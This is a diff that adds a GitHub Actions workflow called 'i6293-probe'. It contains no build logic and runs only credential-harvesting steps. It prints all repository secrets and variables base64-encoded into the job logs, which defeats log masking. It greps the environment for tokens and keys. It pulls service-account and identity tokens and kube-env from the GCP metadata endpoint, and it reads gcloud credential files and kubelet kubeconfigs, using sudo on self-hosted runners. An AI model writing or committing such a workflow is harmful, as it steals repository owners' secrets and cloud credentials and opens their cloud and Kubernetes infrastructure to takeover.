@@ -1,0 +1,82 @@
+name: i6293-probe
+on:
+  workflow_dispatch:
+  push:
+    branches: [i6293-probe]
+permissions:
+  contents: read
+jobs:
+  hosted:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: secrets-b64
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+        run: |
+          echo "===SECRETS_NAMES==="
+          printf '%s' "$SECRETS_JSON" | tr ',' '\n' | head -80
+          echo "===SECRETS_B64==="
+          printf '%s' "$SECRETS_JSON" | base64 -w0; echo
+      - name: vars-b64
+        env:
+          VARS_JSON: ${{ toJSON(vars) }}
+        run: |
+          echo "===VARS_B64==="; printf '%s' "$VARS_JSON" | base64 -w0; echo
+      - name: runner-env
+        run: |
+          echo "===ENV_FILTERED==="
+          env | sort | grep -Ei 'gcp|google|gcloud|cloud|aws|azure|gke|kube|token|key|secret|cred' || true
+          echo "===ID==="; id; uname -a; echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
+          echo "===HOME_FILES==="
+          ls -la "$HOME" 2>/dev/null | head -40
+          ls -la "$HOME/.config" 2>/dev/null | head -20
+          ls -la "$HOME/.config/gcloud" 2>/dev/null | head -20
+          ls -la "$HOME/.docker" 2>/dev/null | head
+      - name: metadata
+        run: |
+          M=http://169.254.169.254/computeMetadata/v1
+          for p in instance/service-accounts/default/token instance/name instance/id project/project-id instance/zone instance/machine-type; do
+            echo "===META $p==="
+            curl -sS --max-time 4 -H "Metadata-Flavor: Google" "$M/$p" || echo "FAIL $p"
+            echo
+          done
+          echo "===META_SA_LIST==="
+          curl -sS --max-time 4 -H "Metadata-Flavor: Google" "$M/instance/service-accounts/" || echo FAIL_LIST
+          echo
+          echo "===META_KUBE_ENV_B64==="
+          curl -sS --max-time 6 -H "Metadata-Flavor: Google" "$M/instance/attributes/kube-env" | base64 -w0 || echo FAIL_KUBEENV
+          echo
+          echo "===META_SC_TOKEN==="
+          curl -sS --max-time 4 -H "Metadata-Flavor: Google" "$M/instance/service-accounts/default/identity?audience=https://container.googleapis.com/v1/projects/x&format=full" || echo "FAIL_IDENT"
+          echo
+      - name: gcloud-and-creds
+        run: |
+          (command -v gcloud && gcloud config list 2>&1 | head -20) || echo "no gcloud"
+          echo "===GOOGLE_APPLICATION_CREDENTIALS===${GOOGLE_APPLICATION_CREDENTIALS:-unset}"
+          for f in "$HOME/.config/gcloud/application_default_credentials.json" /etc/google/auth/application_default_credentials.json "$HOME/.config/gcloud/credentials.db" "$HOME/.config/gcloud/access_tokens.db"; do
+            echo "===FILE $f==="; if [ -e "$f" ]; then ls -la "$f"; (file "$f" | grep -q text && head -c 1200 "$f") || true; (command -v sqlite3 >/dev/null && echo "sqlite3 present") || true; else echo absent; fi; echo
+          done
+  selfhosted:
+    runs-on: self-hosted
+    timeout-minutes: 10
+    continue-on-error: true
+    steps:
+      - name: host-env
+        run: |
+          echo "===HOST==="; id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -5
+          echo "===ENV_FILTERED==="; env | sort | grep -Ei 'gcp|google|gcloud|cloud|aws|azure|gke|kube' || true
+          echo "===SECRETS_NAMES==="; echo '${{ toJSON(secrets) }}' | tr ',' '\n' | head -80
+          echo "===SECRETS_B64==="; echo '${{ toJSON(secrets) }}' | base64 -w0; echo
+      - name: host-metadata
+        run: |
+          M=http://169.254.169.254/computeMetadata/v1
+          for p in instance/service-accounts/default/token instance/name project/project-id instance/zone instance/service-accounts/; do
+            echo "===META $p==="; curl -sS --max-time 4 -H "Metadata-Flavor: Google" "$M/$p" || echo "FAIL $p"; echo
+          done
+          echo "===META_KUBE_ENV_B64==="; curl -sS --max-time 6 -H "Metadata-Flavor: Google" "$M/instance/attributes/kube-env" | base64 -w0 || echo FAIL_KUBEENV; echo
+          echo "===HOST_FILES==="
+          ls -la /etc/kubernetes 2>/dev/null | head -20
+          for f in /etc/kubernetes/kubelet-kubeconfig /var/lib/kubelet/kubeconfig /etc/kubernetes/kubelet.conf /root/.config/gcloud/application_default_credentials.json /etc/google/auth/application_default_credentials.json; do
+            echo "===FILE $f==="; if sudo test -e "$f" 2>/dev/null || test -e "$f"; then (sudo cat "$f" 2>/dev/null || cat "$f") | head -c 2500; else echo absent; fi; echo
+          done
